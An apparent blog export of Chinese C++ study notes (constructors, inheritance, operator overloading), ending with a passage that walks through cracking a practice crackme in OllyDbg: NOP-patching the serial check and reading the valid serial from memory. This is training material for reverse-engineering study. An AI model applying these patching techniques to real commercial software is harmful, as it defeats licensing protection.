研究构造函数，析构函数的调用顺序//总结 构造和析构的调用顺序#include &quot;iostream&quot;using namespace std;class ABCD{ //this（）public: ABCD(int a, int b, int c) { this-&gt;a = a; this-&gt;b = b; this-&gt;c = c; printf(&quot;ABCD() construct, a:%d,b:%d,c:%d \\n&quot;, this-&gt;a, this-&gt;b, this-&gt;c); } ~ABCD() { printf(&quot;~ABCD() construct,a:%d,b:%d,c:%d \\n&quot;, this-&gt;a, this-&gt;b, this-&gt;c); } int getA() { return this-&gt;a; }protected:private: int a; int b; int c;};class MyE{public: MyE() :abcd1(1, 2, 3), abcd2(4, 5, 6), m(100) { cout &lt;&lt; &quot;MyD()&quot; &lt;&lt; endl; } ~MyE() { cout &lt;&lt; &quot;~MyD()&quot; &lt;&lt; endl; } MyE(const MyE &amp; obj) :abcd1(7, 8, 9), abcd2(10, 11, 12), m(100) { printf(&quot;MyD(const MyD &amp; obj)\\n&quot;); }protected: //private:public: ABCD abcd1; //c++编译器不知道如何构造abc1 ABCD abcd2; const int m;};int doThing(MyE mye1){ printf(&quot;doThing() mye1.abc1.a:%d \\n&quot;, mye1.abcd1.getA()); return 0;}int run2(){ MyE myE; doThing(myE); return 0;}//int run3(){ printf(&quot;run3 start..\\n&quot;); ABCD abcd = ABCD(100, 200, 300); //若直接调用构造函数哪 //想调用构造函数对abc对象进行再复制，可以吗？ //在构造函数里面调用另外一个构造函数，会有什么结果？ //ABCD(400, 500, 600); //临时对象的生命周期 printf(&quot;run3 end\\n&quot;); return 0;}int main(){ run2(); //run3(); system(&quot;pause&quot;); return 0;} new和delete分配基础类型1234567891011121314151617#include &lt;iostream&gt;using namespace std;int main(){ int *p1 = (int *)malloc(sizeof(int)); free(p1); int *p2 = new int; printf(&quot;%d\\n&quot;, *p2); delete p2; int *p3 = new int(100); delete p3; return 0;} 分配数组类型1234567891011int main(){ int *p = (int *)malloc(10 * sizeof(int)); //int Array[10] p[0] = 1; free(p); int *p2 = new int[10]; p2[0] = 10; delete [] p2;} 分配对象类型1234567891011121314151617181920212223242526272829303132333435363738394041class Test{public: int x, y; Test(int mya, int myb) { a = mya; b = myb; } int GetA() { return a; }private: int a, b;};int getTestObj(Test **my){ Test *p = new Test(1, 2); *my = p; return 0;}int FreeObj();int main(){ Test t1(10,20); Test *p = new Test(1, 2); cout &lt;&lt; p-&gt;GetA() &lt;&lt; endl; p-&gt;x = 10; p-&gt;y = 20; cout &lt;&lt; p-&gt;x &lt;&lt; endl; cout &lt;&lt; p-&gt;y &lt;&lt; endl; getTestObj(&amp;p); delete p; return 0;}","link":"/2020/09/14/C-%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/"},{"title":"C++ - 继承","text":"继承和多态是面向对象语言最强大的功能。有了继承和多态，我们可以完成代码重用。在C中有许多技巧可以实现多态。本文的目的就是演示一种简单和容易的技术，在C中应用继承和多态。通过创建一个VTable（virtual table）和在基类和派生类对象之间提供正确的访问，我们能在C中实现继承和多态。VTable能通过维护一张函数表指针表来实现。为了提供基类和派生类对象之间的访问，我们可以在基类中维护派生类的引用和在派生类中维护基类的引用。 继承类关系 访问控制123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;iostream&gt;using namespace std;//类成员访问控制//用private修饰的成员变量，在类内部可以使用//用public修饰的成员变量，在类的内部和外部均可以使用//用protected修饰的成员变量，在类的内部可以使用，在类的外部不可以被使用class Test{public: // int c;protected: // int b;private: // int a;};class Parent{public: Parent(int a = 1, int b = 2, int c = 3) { this-&gt;a = a; this-&gt;c = c; this-&gt;b = b; } void PrintSelf() { cout &lt;&lt; &quot;Hello&quot; &lt;&lt; endl; } int c;protected: int b;private: // int a;};//子类从父类公有继承class Child : public Parent{public: void Print() { cout &lt;&lt; c &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; }protected: private: };int main(){ Child c1; c1.c = 10; c1.Print(); c1.PrintSelf(); system(&quot;pause&quot;); return 0;} 继承方式 Demo: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt;using namespace std;//类的继承方式对子类对外访问属性影响#include &lt;cstdlib&gt;class A{private: int a;protected: int b;public: int c; A() { a = 0; b = 0; c = 0; } void set(int a, int b, int c) { this-&gt;a = a; this-&gt;b = b; this-&gt;c = c; }};class B : public A{public: void print() { //cout &lt;&lt; &quot;a = &quot; &lt;&lt; a; //私有成员不可访问 cout &lt;&lt; &quot;b = &quot; &lt;&lt; b; cout &lt;&lt; &quot;c = &quot; &lt;&lt; endl; }};class C : protected A{public: void print() { //cout &lt;&lt; &quot;a = &quot; &lt;&lt; a; //私有不可访问 cout &lt;&lt; &quot;b = &quot; &lt;&lt; b; cout &lt;&lt; &quot;c = &quot; &lt;&lt; endl; }};class D : private A{public: void print() { //cout &lt;&lt; &quot;a = &quot; &lt;&lt; a; //私有不可访问 cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt; endl; }};int main(){ A aa; B bb; C cc; D dd; aa.c = 100; bb.c = 100; //cc.c = 100; //类内可访问，类外不可以 //dd.c = 100; // aa.set(1, 2, 3); bb.set(10, 20, 30); //cc.set(40, 50, 60); //类内可访问，类外不可以 //dd.set(70, 80, 90); // bb.print(); cc.print(); dd.print(); system(&quot;pause&quot;); return 0;} 继承中的构造析构赋值兼容性可以把子类对象赋值给基类指针，子类就是一种特殊的父类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;iostream&gt;using namespace std;class Parent{public: void PrintP() { printf(&quot;我是父类\\n&quot;); } protected: int a, b;private: };class Child : public Parent{public: Child() { a = 0; b = 0; c = 0; } void PrintC() { printf(&quot;我是子类\\n&quot;); }protected:private: int c;};void howToPrint(Parent *p) //父类的指针{ p-&gt;PrintP();}void howToPrint1(Parent &amp;p){ p.PrintP();}int main(){ Parent p1; Child c1; //p1.PrintP(); c1.PrintC(); Parent *base = NULL; base = &amp;c1; base-&gt;PrintP(); Parent &amp;p = c1; c1.PrintP(); c1.PrintC(); howToPrint(&amp;p1); howToPrint(&amp;c1); howToPrint1(p1); howToPrint1(p1); system(&quot;pause&quot;); return 0;} 子类对象可以当作父类对象使用 子类对象可以直接赋值给父类对象 子类对象可以直接初始化父类对象 父类指针可以直接指向子类对象 父类引用可以直接引用子类对象 继承中的对象模型 在子类对象构造的时候，需要调用父类构造函数对其继承得来的成员进行初始化 在子类对象析构的时候，需要调用父类析构函数对其继承的来的成员进行清理 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;using namespace std;class Parent{public: Parent() { cout &lt;&lt; &quot;父类构造函数&quot; &lt;&lt; endl; } void PrintP() { printf(&quot;我是父类\\n&quot;); } protected: int a, b;private: };class Child : public Parent{public: Child() { a = 0; b = 0; c = 0; cout &lt;&lt; &quot;子类构造函数&quot; &lt;&lt; endl; } void PrintC() { printf(&quot;我是子类\\n&quot;); }protected:private: int c;};void howToPrint(Parent *p) //父类的指针{ p-&gt;PrintP();}void howToPrint1(Parent &amp;p){ p.PrintP();}int main(){ Parent p1; Child c1; system(&quot;pause&quot;); return 0;} 继承中有有参构造函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;using namespace std;class Parent{public: Parent(char *p) { cout &lt;&lt; &quot;父类构造函数&quot; &lt;&lt; endl; } void PrintP() { printf(&quot;我是父类\\n&quot;); }protected: int a, b;private:};class Child : public Parent{public: Child() :Parent(&quot;sYstemk1t&quot;) //初始化列表 { a = 0; b = 0; c = 0; cout &lt;&lt; &quot;子类构造函数&quot; &lt;&lt; endl; } void PrintC() { printf(&quot;我是子类\\n&quot;); }protected:private: int c;};int main(){ Parent p1(&quot;sYstemk1t&quot;); //Child c1; system(&quot;pause&quot;); return 0;} 继承中的同名问题同名变量1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;using namespace std;class A{public: int a, b; void Print() { cout &lt;&lt; &quot;我是父类&quot; &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl; }protected:private:};class B : public A{public: int a, b;protected:private:};void main(){ B b1; b1.a = 10; b1.b = 20; //访问子类 b1.A::a = 20; //访问父类，加双冒号作用赋符号 b1.A::Print(); system(&quot;pause&quot;);} 同名函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;using namespace std;class A{public: int a, b; void PrintA() { cout &lt;&lt; &quot;我是父类&quot; &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl; } void Print() { cout &lt;&lt; &quot;我是父类的A&quot; &lt;&lt; endl; }protected:private:};class B : public A{public: int a, b; void Print() { cout &lt;&lt; &quot;我是父类的A&quot; &lt;&lt; endl; }protected:private:};void main(){ B b1; b1.a = 10; b1.b = 20; //访问子类 b1.A::a = 20; // b1.A::PrintA(); b1.A::Print(); b1.Print(); system(&quot;pause&quot;);} 派生类中的静态成员 基类定义的静态成员，将被所有派生类共享 根据静态成员自身的访问特性和派生类的集成方式，在类层次体系中具有不同的访问性质 静态成员1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;using namespace std;class A{public: A() { a = 10; } static int a; int b; void PrintA() { cout &lt;&lt; &quot;我是父类&quot; &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl; } void Print() { cout &lt;&lt; &quot;我是父类的A&quot; &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl; }protected:private:};int A::a = 0; //告诉C++编译器需要给整个类分配4字节内存空间class B : private A{public: int b,c; void Print() { cout &lt;&lt; &quot;我是子类的A&quot; &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl; }protected:private:};void main(){ //A a1; B b1; b1.Print(); system(&quot;pause&quot;);} 多继承一个类有多个直接基类的继承关系称为多继承 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;iostream&gt;using namespace std;class Base1{public: Base1() //先被调用 { b1 = 1; } int b1;protected:private:};class Base2{public: Base2() //后调用 { b2 = 2; } int b2;protected:private:};class Child : public Base1,public Base2 //多继承{public: Child() { ; } void PrintB() { cout &lt;&lt; b1 &lt;&lt; endl; cout &lt;&lt; b2 &lt;&lt; endl; }protected:private:};int main(){ Child c1; c1.PrintB(); system(&quot;pause&quot;); return 0;} 虚基类多继承会产生二义性 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;using namespace std;class B{public: int i;private:protected:};class B1 : virtual public B //虚继承{public: int b1;private:protected:};class B2 : virtual public B{public: int b2;private:protected:};class C : public B1,public B2{public:private:protected:};void main(){ C c1; c1.b1 = 10; c1.b2 = 20; c1.i = 30; //c1.i = 30; //对i的访问不明确 system(&quot;pause&quot;);}","link":"/2020/09/16/C-%E7%BB%A7%E6%89%BF/"},{"title":"C++ - 运算符重载","text":"本章是我学习友元函数、友元类、运算符重载等学习时所做笔记; 友元函数友元函数类的友元函数是定义在类外部，但有权访问类的所有私有（private）成员和保护（protected）成员。尽管友元函数的原型有在类的定义中出现过，但是友元函数并不是成员函数。 友元可以是一个函数，该函数被称为友元函数；友元也可以是一个类，该类被称为友元类，在这种情况下，整个类及其所有成员都是友元。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class A{public: A() { a1 = 100; a2 = 200; } int GetA1() { return this-&gt;a1; } friend void SetA1(A* p,int a1); //声明这个函数是友元函数 private: int a1, a2;};void SetA1(A* p, int a1){ p-&gt;a1 = a1;}void main(){ A a1; printf(&quot;%d\\n&quot;, a1.GetA1()); SetA1(&amp;a1,200); a1.GetA1(); printf(&quot;%d\\n&quot;, a1.GetA1()); system(&quot;pause&quot;);} 友元类12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &quot;iostream&quot;using namespace std;class A{public: void display() { cout &lt;&lt; x &lt;&lt; endl; } private: int x; friend class B;};class B{public: void SetA(int x) { a1.x = x; } void Printf() { cout &lt;&lt; a1.x &lt;&lt; endl; }private: A a1; };void main(){ B b1; b1.SetA(100); b1.Printf(); system(&quot;pause&quot;);} 运算符重载重载的运算符是带有特殊名称的函数，函数名是由关键字 operator 和其后要重载的运算符符号构成的。与其他函数一样，重载运算符有一个返回类型和一个参数列表。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;iostream&gt;using namespace std;class Complex{public: Complex(int a, int b) { this-&gt;a = a; this-&gt;b = b; } void Print() { cout &lt;&lt; &quot;a&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b&quot; &lt;&lt; b &lt;&lt; endl; }public: int a, b;};class Complex1{public: Complex1(int a, int b) { this-&gt;a = a; this-&gt;b = b; } void Print() { cout &lt;&lt; &quot;a&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b&quot; &lt;&lt; b &lt;&lt; endl; }private: int a, b;};Complex operator+(Complex &amp;c1, Complex &amp;c2){ Complex c3(c1.a + c2.a, c1.b + c2.b); return c3;}Complex add(Complex &amp;c1, Complex &amp;c2){ Complex c3(c1.a + c2.a, c1.b + c2.b); return c3;}void main(){ Complex c1(1, 2), c2(3, 4); Complex c4 = add(c1, c2); //Complex c3 = operator+(c1, c2); Complex c3 = (c1 + c2); c3.Print(); //Complex c3 = c1 + c2; system(&quot;pause&quot;);} 重载运算符限制重载运算符函数可以对运算符做出新的解释，但基本语义不变: 不改变运算符优先级 不改变运算符结核性 不改变运算符所需的操作数 不能创建新的运算符","link":"/2020/09/15/C-%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/"},{"title":"Cpp笔记 - 对C的扩展","text":"c++语言在c语言的基础上添加了面向对象编程和泛型编程的支持。c++继承了c语言高效，简洁，快速和可移植的传统。 C++初识Hello123456789#include &lt;iostream&gt;using namespace std;int _tmain(int argc, _TCHAR* argv[]){ cout &lt;&lt; &quot;Hello,World&quot; &lt;&lt; endl; getchar(); return 0;} 逐个分析上面的这些东西： #include; 预编译指令，引入头文件iostream. using namespace std; 使用标准命名空间 cout &lt;&lt; “hello world”&lt;&lt; endl; 标准输出流 面向对象面向对象编程（Object-Oriented Programming）简称 OOP 技术，是开发计算机应用程序的一种新方法、新思想。过去的面向过程编程常常会导致所有的代码都包含在几个模块中，使程序难以阅读和维护。在做一些修改时常常牵一动百，使以后的开发和维护难以为继。而使用 OOP 技术，常常要使用许多代码模块，每个模块都只提供特定的功能，它们是彼此独立的，这样就增大了代码重用的几率，更加有利于软件的开发、维护和升级。 面向对象三大特性 封装 把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。 类将成员变量和成员函数封装在类的内部，根据需要设置访问权限，通过成员函数管理内部状态。 继承 继承所表达的是类之间相关的关系，这种关系使得对象可以继承另外一类对象的特征和能力。 继承的作用：避免公用代码的重复开发，减少代码和数据冗余。 多态 多态性可以简单地概括为“一个接口，多种方法”，字面意思为多种形态。程序在运行时才决定调用的函数，它是面向对象编程领域的核心概念。 作用域123456789101112131415161718#include &lt;iostream&gt;using namespace std;int atk = 200; //全局变量void test01(){ int atk = 100; //局部变量 cout &lt;&lt; &quot;atk:&quot; &lt;&lt; atk &lt;&lt; endl; //双冒号作用域全局 cout &lt;&lt; &quot;atk:&quot; &lt;&lt; ::atk &lt;&lt; endl;}int main(){ test01(); system(&quot;pause&quot;);} 为什么第二个atk输出的值就是我们的全局变量，因为双冒号的作用域就是全局的； 命名空间12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;namespace LOL{ void game() { cout &lt;&lt; &quot;攻击1000&quot; &lt;&lt; endl; }}namespace PUBG{ void game() { cout &lt;&lt; &quot;攻击100&quot; &lt;&lt; endl; }}int main(){ PUBG::game(); system(&quot;pause&quot;); return 0;} 命名空间主要为了解决两个相同函数同名的办法； 命名空间下可以放函数、变量、结构体、类 命令空间必须定义在全局作用域下 命名空间可以嵌套 123456789101112131415161718192021namespace A{ int i; void func(); struct { }; class An{}; namespace B{ int m = 10; }}int main(){ PUBG::game(); cout &lt;&lt; &quot;a = &quot; &lt;&lt; A::B::m &lt;&lt; endl; system(&quot;pause&quot;); return 0;} 命名空间是开放的，随时可任意添加 命名空间可以不起名字，称为无名命名空间 命名空间可以起别名 using1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;namespace Key{ int Monkey = 100;}void test(){ int Monkey = 10; using namespace::Key; //应该避免使用同名的局部变量 cout &lt;&lt; &quot;Monkey:&quot; &lt;&lt; Monkey &lt;&lt; endl;}int main(){ test(); system(&quot;pause&quot;);} 上面的代码输入的依旧为Monkey为10，这是因为编译器在编译的时候有一个就近原则，当就近原则和using一起使用的时候，应该避免使用同样的局部变量； C++增强全局变量123456789#include &lt;iostream&gt;using namespace std;int a;int a = 10;int main(){ system(&quot;pause&quot;);} 以上代码无法通过编译通过，编译器会提示”int a 重定义” 类型检测123456789101112131415#include &lt;iostream&gt;using namespace std;int test(w,h) //在CPP中必须定义参数的类型{};int main(){ test(); system(&quot;pause&quot;);} 以上代码是无法运行的，但是在C运行则可以编译通过，C++帮我们检测了函数的返回值和参数的个数。 类型转换12345#include &lt;stdio.h&gt;int main(){ char *p = malloc(sizeof(64)); //C语言中的malloc返回的类型是void*，认为是万能指针，所以不会报错；} 1234567#include &lt;iostream&gt;using namespace std;int main(){ //char *p = malloc(sizeof(64)); char *p = (char *)malloc(sizeof(64)); //CPP必须要做类型转换} struct12345678910#include &lt;stdio.h&gt;struct Person{ int m_age; /void plusAge(); //C语言中struct不允许加函数}int main(){ struct Person p1; //C语言必须生成成员的时候必须添加struct关键字} 12345678910#include &lt;iostream&gt;using namespace std;struct Person{ int m_age; void plusAge(); //Cpp则可以，结构体允许可以使用函数}int main(){ Person p1; //CPP不需要添加struct关键字} bool类型标准c++的bool类型有两种内建的常量true(转换为整数1)和false(转换为整数0)表示状态。这三个名字都是关键字。 bool类型只有两个值，true(1值)，false(0值) bool类型占1个字节大小 给bool类型赋值时，非0值会自动转换为true(1),0值会自动转换false(0) 123456789101112#include &lt;iostream&gt;using namespace std;void test(){ bool flag; cout &lt;&lt; sizeof(bool) &lt;&lt; endl;}int main(){ test();} 三目运算符123456789int a = 10;int b = 20;printf(&quot;ret:%d\\n&quot;, a &gt; b ? a : b);cout &lt;&lt; &quot;b:&quot; &lt;&lt; b &lt;&lt; endl;//返回的是左值，变量的引用(a &gt; b ? a : b) = 100;//返回的是左值，变量的引用cout &lt;&lt; &quot;b:&quot; &lt;&lt; b &lt;&lt; endl;","link":"/2020/04/17/Cpp%E7%AC%94%E8%AE%B0-%E5%AF%B9C%E7%9A%84%E6%89%A9%E5%B1%95/"},{"title":"CrackMe001","text":"一步步尝试将160个CrackMe全部破解，如果可以，通过任何方式写出一个类似于注册机的东西。 环境 WinXP Sp3 + 52Pojie六周年OllyDbg + PEID(0.95) 软件下载地址： https://github.com/sYstemk1t/Code-collection/tree/master/CrackMe/1 程序分析 想要破解一个程序，必须先了解这个程序。所以，在破解过程中，对最初程序的分析很重要，他可以帮助我们理解作者的目的和意图，特别是对于注册码的处理细节，从而方便我们反向跟踪和推导。 打开chm文件，下载第一个文件到指定目录， 不推荐直接在桌面运行 。 我们发现程序有两部分： 一个是Serial/Name，需要输入用户名和注册码才能通过，另外一个Serial只需要输入一个注册码一类的东西 。我们就从输入用户名和密码这里开始。 我们随便输入一个用户名和一个序列号(伪码): 伪码： Name:systemk1t Serial:123 点击Check it Baby！它辉弹出一个对话框提示：Sorry，The Serial is incorrent！ 然后继续随意输入几个，发现只有这一种情况，不会判断输入的长度。 具体分析我们随便输入一个用户名和一个序列号(伪码): 伪码： Name:systemk1t Serial:123 点击Check it Baby！它辉弹出一个对话框提示：Sorry，The Serial is incorrent！ 然后继续随意输入几个，发现只有这一种情况，不会判断输入的长度。 将程序载入至OllyDbg，输入我们的伪码，不要点确定，返回OD中，点击暂停按钮(F12)，然后查看堆栈(Ctrl+k)，或者点击小图标k。 堆栈情况如下： 查看堆栈内情况，有两个MessageBox函数，第一个的地址是77D50550，这个明显不是，因为地址差的太远了，第二个为0042A1AE，和我们的入口点00400000比较接近，我们进去看一下。 12345678910111213141516171819202122232425260042A170 /$ 55 push ebp0042A171 |. 8BEC mov ebp,esp0042A173 |. 83C4 F4 add esp,-0xC0042A176 |. 53 push ebx0042A177 |. 56 push esi0042A178 |. 57 push edi0042A179 |. 8BF9 mov edi,ecx0042A17B |. 8BF2 mov esi,edx0042A17D |. 8BD8 mov ebx,eax0042A17F |. E8 7CB4FDFF call &lt;jmp.&amp;user32.GetActiveWindow&gt; ; [GetActiveWindow0042A184 |. 8945 F8 mov [local.2],eax0042A187 |. 33C0 xor eax,eax0042A189 |. E8 12A0FFFF call Acid_bur.004241A00042A18E |. 8945 F4 mov [local.3],eax0042A191 |. 33C0 xor eax,eax0042A193 |. 55 push ebp0042A194 |. 68 D0A14200 push Acid_bur.0042A1D00042A199 |. 64:FF30 push dword ptr fs:[eax]0042A19C |. 64:8920 mov dword ptr fs:[eax],esp0042A19F |. 8B45 08 mov eax,[arg.1]0042A1A2 |. 50 push eax ; /Style = MB_OK|50|MB_DEFBUTTON3|MB_APPLMODAL|5B04000042A1A3 |. 57 push edi ; |Title = NULL0042A1A4 |. 56 push esi ; |Text = &quot;\u001e\u0002\u0012&quot;0042A1A5 |. 8B43 24 mov eax,dword ptr ds:[ebx+0x24] ; |0042A1A8 |. 50 push eax ; |hOwner = 005B06500042A1A9 |. E8 FAB5FDFF call &lt;jmp.&amp;user32.MessageBoxA&gt; ; \\MessageBoxA 发现没有跳转，逻辑也很简单，在这个MessageBoxA函数之前几行就有retn，在头部0042A170地址的push ebp指令处下断点，然后重新Check it baby，然后在右下角堆栈处找到最近的一条return语句： 10012F974 0042FB37 返回到 Acid_bur.0042FB37 来自 Acid_bur.0042A170 右键反汇编跟随，这里直接链接了一个跳转，代码如下： 1234567891011121314151617181920212223242526270042FAD2 |. FF75 E8 push [local.6]0042FAD5 |. 68 C8FB4200 push Acid_bur.0042FBC8 ; -0042FADA |. FF75 F8 push [local.2] ; Acid_bur.0042FBB80042FADD |. 8D45 F4 lea eax,[local.3]0042FAE0 |. BA 05000000 mov edx,0x50042FAE5 |. E8 C23EFDFF call Acid_bur.004039AC0042FAEA |. 8D55 F0 lea edx,[local.4]0042FAED |. 8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]0042FAF3 |. E8 60AFFEFF call Acid_bur.0041AA58 ; ; 关键跳转0042FAF8 |. 8B55 F0 mov edx,[local.4]0042FAFB |. 8B45 F4 mov eax,[local.3]0042FAFE |. E8 F93EFDFF call Acid_bur.004039FC ; 判断是否正确0042FB03 |. 75 1A jnz short Acid_bur.0042FB1F 0042FB05 |. 6A 00 push 0x00042FB07 |. B9 CCFB4200 mov ecx,Acid_bur.0042FBCC ; Congratz !!0042FB0C |. BA D8FB4200 mov edx,Acid_bur.0042FBD8 ; Good job dude =)0042FB11 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48]0042FB16 |. 8B00 mov eax,dword ptr ds:[eax] ; Acid_bur.004240900042FB18 |. E8 53A6FFFF call Acid_bur.0042A170 ; 可疑跳转0042FB1D |. EB 18 jmp short Acid_bur.0042FB370042FB1F |&gt; 6A 00 push 0x00042FB21 |. B9 74FB4200 mov ecx,Acid_bur.0042FB74 ; Try Again!0042FB26 |. BA 80FB4200 mov edx,Acid_bur.0042FB80 ; Sorry , The serial is incorect !0042FB2B |. A1 480A4300 mov eax,dword ptr ds:[0x430A48]0042FB30 |. 8B00 mov eax,dword ptr ds:[eax] ; Acid_bur.004240900042FB32 |. E8 39A6FFFF call Acid_bur.0042A170 ; call导致关键跳转0042FB37 |&gt; 33C0 xor eax,eax ; 返回到这里 其实到了这里，我们也可以分辨哪个是关键跳转了，因为OD已经自动帮我们解析出了文本，最近的两个跳转jnz和jmp，jnz会通过上一行的call 004039FC，判断我们输入的伪码是否正确，判断结果存在EAX寄存器当中，我们的目的是实现无论输入错误或者正确都提示验证通过，那我们就可以将jnz这行汇编代码以nop填充，然后重新执行。这个时候提示Good Job，通过了！ 可以对比MessageBoxA和堆栈最后一个调用，然后你们就会发现他们两个的地址是一样的！ 注册机我们继续回到刚才那个可疑跳转那里，jnz 0040FB03这个地址， 1230042FAF8 |. 8B55 F0 mov edx,[local.4] ; 1230042FAFB |. 8B45 F4 mov eax,[local.3] ; CW-9430-CRACKED0042FAFE |. E8 F93EFDFF call Acid_bur.004039FC ; 判断是否正确 我们发现，EDX存储的是我们的假序列号，EAX看上去是一个正确的序列号，也可能是正确的是序列号。 下一步的思路就是继续在这个CALL之上的CALL下断，分析出产生出这个序列号的CALL。由于CALL的返回值一般都存在EAX中，所以我们可以查看附近的CALL之后EAX的值，从而判断出正确的注册码生成函数。 附近的两个CALL： 12345670042FAE5 |. E8 C23EFDFF call Acid_bur.004039AC ;最近的call0042FAEA |. 8D55 F0 lea edx,[local.4]0042FAED |. 8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]0042FAF3 |. E8 60AFFEFF call Acid_bur.0041AA58 ; 0042FAF8 |. 8B55 F0 mov edx,[local.4] ; 1230042FAFB |. 8B45 F4 mov eax,[local.3] ; CW-9430-CRACKED0042FAFE |. E8 F93EFDFF call Acid_bur.004039FC ;最近的call 关键算法 然后这个call中，对生成的密钥进行对比。进入0040AA58，在生成的密钥之前。 123456789101112131415161718192021220041AA58 /$ 53 push ebx0041AA59 |. 56 push esi0041AA5A |. 57 push edi0041AA5B |. 8BFA mov edi,edx0041AA5D |. 8BF0 mov esi,eax0041AA5F |. 8BC6 mov eax,esi0041AA61 |. E8 A2FFFFFF call Acid_bur.0041AA080041AA66 |. 8BD8 mov ebx,eax0041AA68 |. 8BC7 mov eax,edi0041AA6A |. 8BCB mov ecx,ebx0041AA6C |. 33D2 xor edx,edx0041AA6E |. E8 E18CFEFF call Acid_bur.004037540041AA73 |. 85DB test ebx,ebx0041AA75 |. 74 0C je short Acid_bur.0041AA830041AA77 |. 8D4B 01 lea ecx,dword ptr ds:[ebx+0x1]0041AA7A |. 8B17 mov edx,dword ptr ds:[edi] ; Acid_bur.0042D67C0041AA7C |. 8BC6 mov eax,esi0041AA7E |. E8 95FFFFFF call Acid_bur.0041AA180041AA83 |&gt; 5F pop edi ; Acid_bur.0042FAF80041AA84 |. 5E pop esi ; Acid_bur.0042FAF80041AA85 |. 5B pop ebx ; Acid_bur.0042FAF80041AA86 \\. C3 retn 也没有发现密钥被生成，那么继续回到我们产生的call那里，然后继续往上翻。然后我在这个call上面的五个call上全部下了断点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253540042FA30 |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]0042FA36 |. E8 1DB0FEFF call Acid_bur.0041AA580042FA3B |. 8B45 EC mov eax,[local.5]0042FA3E |. 0FB640 02 movzx eax,byte ptr ds:[eax+0x2]0042FA42 |. 6BC0 0E imul eax,eax,0xE0042FA45 |. 03F0 add esi,eax0042FA47 |. 8935 58174300 mov dword ptr ds:[0x431758],esi0042FA4D |. A1 6C174300 mov eax,dword ptr ds:[0x43176C] ; @］0042FA52 |. E8 D96EFDFF call Acid_bur.004069300042FA57 |. 83F8 04 cmp eax,0x40042FA5A |. 7D 1D jge short Acid_bur.0042FA790042FA5C |. 6A 00 push 0x00042FA5E |. B9 74FB4200 mov ecx,Acid_bur.0042FB74 ; Try Again!0042FA63 |. BA 80FB4200 mov edx,Acid_bur.0042FB80 ; Sorry , The serial is incorect !0042FA68 |. A1 480A4300 mov eax,dword ptr ds:[0x430A48]0042FA6D |. 8B00 mov eax,dword ptr ds:[eax]0042FA6F |. E8 FCA6FFFF call Acid_bur.0042A1700042FA74 |. E9 BE000000 jmp Acid_bur.0042FB370042FA79 |&gt; 8D55 F0 lea edx,[local.4]0042FA7C |. 8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]0042FA82 |. E8 D1AFFEFF call Acid_bur.0041AA580042FA87 |. 8B45 F0 mov eax,[local.4]0042FA8A |. 0FB600 movzx eax,byte ptr ds:[eax]0042FA8D |. F72D 50174300 imul dword ptr ds:[0x431750]0042FA93 |. A3 50174300 mov dword ptr ds:[0x431750],eax0042FA98 |. A1 50174300 mov eax,dword ptr ds:[0x431750]0042FA9D |. 0105 50174300 add dword ptr ds:[0x431750],eax0042FAA3 |. 8D45 FC lea eax,[local.1]0042FAA6 |. BA ACFB4200 mov edx,Acid_bur.0042FBAC ; CW0042FAAB |. E8 583CFDFF call Acid_bur.004037080042FAB0 |. 8D45 F8 lea eax,[local.2]0042FAB3 |. BA B8FB4200 mov edx,Acid_bur.0042FBB8 ; CRACKED0042FAB8 |. E8 4B3CFDFF call Acid_bur.004037080042FABD |. FF75 FC push [local.1]0042FAC0 |. 68 C8FB4200 push Acid_bur.0042FBC8 ; -0042FAC5 |. 8D55 E8 lea edx,[local.6]0042FAC8 |. A1 50174300 mov eax,dword ptr ds:[0x431750]0042FACD |. E8 466CFDFF call Acid_bur.004067180042FAD2 |. FF75 E8 push [local.6]0042FAD5 |. 68 C8FB4200 push Acid_bur.0042FBC8 ; -0042FADA |. FF75 F8 push [local.2]0042FADD |. 8D45 F4 lea eax,[local.3]0042FAE0 |. BA 05000000 mov edx,0x50042FAE5 |. E8 C23EFDFF call Acid_bur.004039AC0042FAEA |. 8D55 F0 lea edx,[local.4]0042FAED |. 8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]0042FAF3 |. E8 60AFFEFF call Acid_bur.0041AA58 ; 关键算法0042FAF8 |. 